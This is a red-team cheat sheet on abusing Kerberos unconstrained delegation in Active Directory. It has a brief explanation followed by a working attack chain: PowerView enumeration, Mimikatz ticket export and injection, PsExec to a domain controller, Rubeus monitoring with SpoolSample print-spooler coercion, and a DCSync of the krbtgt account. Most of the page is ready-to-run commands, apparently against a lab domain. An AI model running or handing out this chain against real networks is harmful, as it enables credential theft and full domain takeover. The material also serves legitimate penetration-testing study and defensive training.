# Uncontrained Delegation

## Summary

This a feature that a Domain Administrator can set to any **Computer** inside the domain. Then, anytime a **user logins** onto the Computer, a **copy of the TGT** of that user is going to be **sent inside the TGS** provided by the DC **and saved in memory in LSASS**. So, if you have Administrator privileges on the machine, you will be able to **dump the tickets and impersonate the users** on any machine.

## Enumeration

{% code overflow="wrap" %}
```powershell
# Powerview - Find computers configured with unconstrained delegation
Get-DomainComputer -Unconstrained
# Find IP address of appsrv01
nslookup appsrv01
```
{% endcode %}

## Exploitation

### With Phishing / Social Engineering

```powershell
# Get targeted user to connect to machine with unconstrained delegation by phishing
# Export tickets with Mimikatz
privilege::debug
sekurlsa::tickets /export
# Injecting ticket in Mimikatz
kerberos::ptt [0;9eaea]-2-0-60a10000-admin@krbtgt-PROD.CORP1.COM.kirbi
# Confirm code execution with psexec
C:\Tools\SysinternalsSuite\PsExec.exe \\cdc01 cmd
```

### No user interaction

```powershell
# Monitoring TGT from CDC01$ with Rubeus
Rubeus.exe monitor /interval:5 /filteruser:CDC01$
# Initiate print spooler change notification
SpoolSample.exe CDC01 APPSRV01
# Injecting TGT with Rubeus
Rubeus.exe ptt /ticket:doIFIjCCBR6gAwIBBaEDAgEWo...
# Executing DCSync as CDC01$ with Mimikatz
lsadump::dcsync /domain:prod.corp1.com /user:prod\krbtgt
```
